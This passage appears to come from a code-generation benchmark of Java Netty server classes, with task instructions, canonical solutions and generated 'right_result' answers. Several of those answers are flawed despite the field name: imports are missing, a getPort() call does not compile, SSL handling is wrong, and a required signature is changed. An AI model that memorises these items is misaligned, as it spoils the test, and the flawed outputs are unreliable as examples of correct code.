    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.TrustManagerFactory;\n\npublic class HttpHelloWorldServer {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        new HttpHelloWorldServer().start();\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (SSL) {\n                         SSLContext sslCtx = createSSLContext();\n                         SSLEngine engine = sslCtx.createSSLEngine();\n                         engine.setUseClientMode(false);\n                         p.addLast(new SslHandler(engine));\n                     }\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new HttpHelloWorldHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private SSLContext createSSLContext() throws Exception {\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        tmf.init((KeyStore) null);\n\n        SSLContext sslCtx = SSLContext.getInstance(\"TLS\");\n        sslCtx.init(null, tmf.getTrustManagers(), new SecureRandom());\n\n        return sslCtx;\n    }\n}\n```"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: The FactorialServer class is a Netty-based TCP server that listens for incoming client connections on a specified port. It supports both plain and SSL-encrypted connections, and uses a separate initializer class to configure the channel pipeline for request processing.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled\n- PORT: int - The port number on which the server will listen for connections\n\nMethods:\n- start(): void - Starts the Netty TCP server with the configured settings. Handles server initialization, binding to the specified port, and proper resource cleanup on shutdown. Throws Exception if any error occurs during server startup.\n\nInput: None (Configuration is done through system properties: \"ssl\" for enabling SSL and \"port\" for specifying the server port)\n\nOutput: None (The server runs continuously until shutdown)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class FactorialServer {\n    private final boolean SSL;\n    private final int PORT;\n\n    public FactorialServer(boolean SSL, int PORT) {\n        this.SSL = SSL;\n        this.PORT = PORT;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (SSL) {\n                         SslContext sslCtx = createSslContext();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new FactorialRequestHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static SslContext createSslContext() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        return SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = Boolean.parseBoolean(System.getProperty(\"ssl\", \"false\"));\n        int port = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n        new FactorialServer(ssl, port).start();\n    }\n}\n```"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of starting and stopping the server, and handling incoming client connections through a configurable pipeline.\n\nClass Description: MocoServer is a Netty-based TCP server implementation that provides simple start/stop functionality and allows for custom channel pipeline configuration. It manages server resources including event loop groups and channel futures.\n\nAttributes:\n- group: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- future: [ChannelFuture] - Future representing the server's channel binding operation\n\nMethods:\n- MocoServer() -> [void] - Constructor that initializes the event loop group\n- start([int port, ChannelInitializer<? extends Channel> pipelineFactory]) -> [int] - Starts the server on specified port with given pipeline configuration, returns actual bound port\n- stop() -> [void] - Stops the server gracefully, releasing all resources",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport com.github.dreamhead.moco.util.MocoExecutors;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.Future;\n\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic final class MocoServer {\n    private EventLoopGroup group;\n    private ChannelFuture future;\n\n    public MocoServer() {\n        group = new NioEventLoopGroup(0, MocoExecutors.executor());\n    }\n\n    public int start(final int port, final ChannelInitializer<? extends Channel> pipelineFactory) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(pipelineFactory);\n\n        try {\n            future = bootstrap.bind(port).sync();\n            SocketAddress socketAddress = future.channel().localAddress();\n            return ((InetSocketAddress) socketAddress).getPort();\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        }\n    }\n\n    public void stop() {\n        if (future != null) {\n            future.channel().close().syncUninterruptibly();\n            future = null;\n        }\n\n        if (group != null) {\n            Future<?> groupFuture = group.shutdownGracefully(0, 0, TimeUnit.SECONDS);\n            try {\n                groupFuture.get();\n            } catch (Exception e) {\n                throw new IllegalStateException(e);\n            }\n            group = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MocoServer {\n    private EventLoopGroup group;\n    private ChannelFuture future;\n\n    public MocoServer() {\n        this.group = new NioEventLoopGroup();\n    }\n\n    public int start(int port, ChannelInitializer<? extends SocketChannel> pipelineFactory) throws Exception {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(group)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(pipelineFactory);\n\n        future = b.bind(port).sync();\n        return future.channel().localAddress().getPort();\n    }\n\n    public void stop() throws InterruptedException {\n        if (future != null) {\n            future.channel().closeFuture().sync();\n        }\n        group.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle custom protocol messages with proper encoding/decoding and processing.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes custom protocol messages using dedicated encoder/decoder and handler components.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nMAX_FRAME_LENGTH: static final int - Maximum allowed frame length for incoming messages (1MB)\nLENGTH_FIELD_LENGTH: static final int - Length of the length field in the protocol (4 bytes)\nLENGTH_FIELD_OFFSET: static final int - Offset of the length field in the protocol (6 bytes)\nLENGTH_ADJUSTMENT: static final int - Adjustment value for the length field (0)\nINITIAL_BYTES_TO_STRIP: static final int - Number of bytes to strip from the beginning of the message (0)\n\nMethods:\nProtocolServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the Netty server, configures the pipeline with protocol handlers, and begins listening for connections (throws Exception)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class ProtocolServer {\n\n    private int port;\n    \n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n    \n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET,LENGTH_FIELD_LENGTH, \n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\n\npublic class ProtocolServer {\n    private final int port;\n    public static final int MAX_FRAME_LENGTH = 1 * 1024 * 1024;\n    public static final int LENGTH_FIELD_LENGTH = 4;\n    public static final int LENGTH_FIELD_OFFSET = 6;\n    public static final int LENGTH_ADJUSTMENT = 0;\n    public static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new LengthFieldBasedFrameDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                     p.addLast(new LengthFieldPrepender(LENGTH_FIELD_LENGTH));\n                     p.addLast(new ProtocolMessageHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    // Custom handler for protocol messages\n    public static class ProtocolMessageHandler extends io.netty.channel.SimpleChannelInboundHandler<byte[]> {\n        @Override\n        protected void channelRead0(io.netty.channel.ChannelHandlerContext ctx, byte[] msg) throws Exception {\n            // Process the received message\n            System.out.println(\"Received message: \" + new String(msg));\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length != 1) {\n            System.err.println(\"Usage: \" + ProtocolServer.class.getSimpleName() + \" <port>\");\n            return;\n        }\n\n        int port = Integer.parseInt(args[0]);\n        new ProtocolServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling both secure (SSL) and non-secure connections on the same port.\n\nClass Description: PortUnificationServer is a Netty-based TCP server that listens on a specified port and can handle both SSL and plaintext connections through port unification. It uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: int - The port number on which the server will listen for incoming connections (default: 8080)\n\nMethods:\nmain: main(String[] args) -> void - The entry point of the application that:\n1. Creates a self-signed SSL certificate for testing\n2. Sets up Netty's event loop groups\n3. Configures the server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Handles graceful shutdown of resources\n\nThe method throws Exception to handle potential errors during server setup and operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class PortUnificationServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        final SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new PortUnificationServerHandler(sslCtx));\n                }\n            });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class PortUnificationServer {\n    private static final int PORT = 8080;\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ch.isActive()) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new PortUnificationHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n\nclass PortUnificationHandler extends SimpleChannelInboundHandler<Object> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        // Handle incoming messages here\n    }\n}\n```"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket server using Netty framework to handle WebSocket connections and messages.\n\nClass Description: The WebSocketServer class is responsible for initializing and running a Netty-based WebSocket server. It configures the server with appropriate handlers for HTTP and WebSocket protocols, manages connection threads, and binds to a specified port.\n\nAttributes:\n- initParamDTO: InitParamDTO - Configuration parameters for the server including port number and thread counts\n\nMethods:\n- WebSocketServer(InitParamDTO initParamDTO) -> None - Constructor that initializes the server with configuration parameters\n- run() -> None - Starts the WebSocket server, configures the pipeline with necessary handlers, and binds to the specified port",
    "Canonical_solution": "import com.cf.carpark.service.core.dto.InitParamDTO;\nimport com.cf.carpark.service.websocket.handler.WebSocketFrameHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.CharsetUtil;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.InetSocketAddress;\n\n@Slf4j\npublic class WebSocketServer {\n\n    private InitParamDTO initParamDTO;\n\n    public void run() {\n        EventLoopGroup boosGroup = new NioEventLoopGroup(initParamDTO.getBoosTread());\n        EventLoopGroup workGroup = new NioEventLoopGroup(initParamDTO.getWorkTread());\n        try {\n            ServerBootstrap serverBootstrap = new ServerBootstrap();\n            InitParamDTO initParamDTO = this.initParamDTO;\n            serverBootstrap.group(boosGroup, workGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel socketChannel) throws Exception {\n                            ChannelPipeline pipeline = socketChannel.pipeline();\n\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new ChunkedWriteHandler());\n                            pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new HttpObjectAggregator(1024 * 1024));\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new WebSocketFrameHandler(initParamDTO));\n                        }\n                    });\n\n            ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(this.initParamDTO.getPort()))\n                    .addListener(future -> {\n                        log.info(\"\u670d\u52a1\u7aef\u6210\u529f\u7ed1\u5b9a\u7aef\u53e3\u53f7={}\", this.initParamDTO.getPort());\n                    });\n        } catch (Exception e) {\n            boosGroup.shutdownGracefully();\n            workGroup.shutdownGracefully();\n            log.error(\"websocketServer\u542f\u52a8\u5931\u8d25:{}\", e);\n        }\n    }\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\npublic class WebSocketServer {\n    private final InitParamDTO initParamDTO;\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(initParamDTO.getBossThreadCount());\n        EventLoopGroup workerGroup = new NioEventLoopGroup(initParamDTO.getWorkerThreadCount());\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new HttpServerCodec());\n                     ch.pipeline().addLast(new ChunkedWriteHandler());\n                     ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(new WebSocketServerProtocolHandler(\"/websocket\"));\n                     ch.pipeline().addLast(new WebSocketFrameHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(initParamDTO.getPort()).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests, with configurable bind address and port, and proper resource management for startup and shutdown.\n\nClass Description: WebConfigContainer is a container class that manages the lifecycle of a Netty-based HTTP server. It initializes and configures the server components, starts the server on a specified port, and provides graceful shutdown capabilities.\n\nAttributes:\n- serverWorkerGroup: [NioEventLoopGroup] - Worker thread group for handling I/O operations\n- serverBossGroup: [NioEventLoopGroup] - Boss thread group for accepting incoming connections\n- logger: [Logger] - SLF4J logger instance for logging server events\n\nMethods:\n- WebConfigContainer() -> [void] - Constructor that initializes the boss and worker event loop groups\n- start() -> [void] - Starts the HTTP server by configuring ServerBootstrap, setting up the channel pipeline with HTTP handlers, and binding to the configured port\n- stop() -> [void] - Gracefully shuts down the server by closing the event loop groups and releasing all resources",
    "Canonical_solution": "import org.fengfei.lanproxy.common.container.Container;\nimport org.fengfei.lanproxy.server.config.ProxyConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\npublic class WebConfigContainer implements Container {\n\n    private static Logger logger = LoggerFactory.getLogger(WebConfigContainer.class);\n\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n\n    public WebConfigContainer() {\n        serverBossGroup = new NioEventLoopGroup(1);\n        serverWorkerGroup = new NioEventLoopGroup(1);\n    }\n\n    @Override\n    public void start() {\n        ServerBootstrap httpServerBootstrap = new ServerBootstrap();\n        httpServerBootstrap.group(serverBossGroup, serverWorkerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(new HttpServerCodec());\n                    pipeline.addLast(new HttpObjectAggregator(8 * 1024 * 1024));\n                    pipeline.addLast(new ChunkedWriteHandler());\n                    pipeline.addLast(new HttpRequestHandler());\n                }\n            });\n\n        try {\n            httpServerBootstrap.bind(ProxyConfig.getInstance().getConfigServerBind(),\n                    ProxyConfig.getInstance().getConfigServerPort()).get();\n            logger.info(\"http server start on port \" + ProxyConfig.getInstance().getConfigServerPort());\n        } catch (Exception ex) {\n            throw new RuntimeException(ex);\n        }\n    }\n\n    @Override\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class WebConfigContainer {\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n    private Logger logger = LoggerFactory.getLogger(WebConfigContainer.class);\n\n    public WebConfigContainer() {\n        this.serverWorkerGroup = new NioEventLoopGroup();\n        this.serverBossGroup = new NioEventLoopGroup();\n    }\n\n    public void start(int port) throws Exception {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(serverBossGroup, serverWorkerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new HttpRequestDecoder());\n                 p.addLast(new HttpResponseEncoder());\n                 p.addLast(new HttpObjectAggregator(65536));\n                 p.addLast(new HttpServerHandler());\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture f = b.bind(port).sync();\n        if (f.isSuccess()) {\n            logger.info(\"HTTP server started at port {}\", port);\n        } else {\n            throw new Exception(\"Failed to start HTTP server\");\n        }\n    }\n\n    public void stop() {\n        if (serverWorkerGroup != null) {\n            serverWorkerGroup.shutdownGracefully();\n        }\n        if (serverBossGroup != null) {\n            serverBossGroup.shutdownGracefully();\n        }\n        logger.info(\"HTTP server stopped\");\n    }\n}\n```"
  },
  {
    "Task_id": 227,
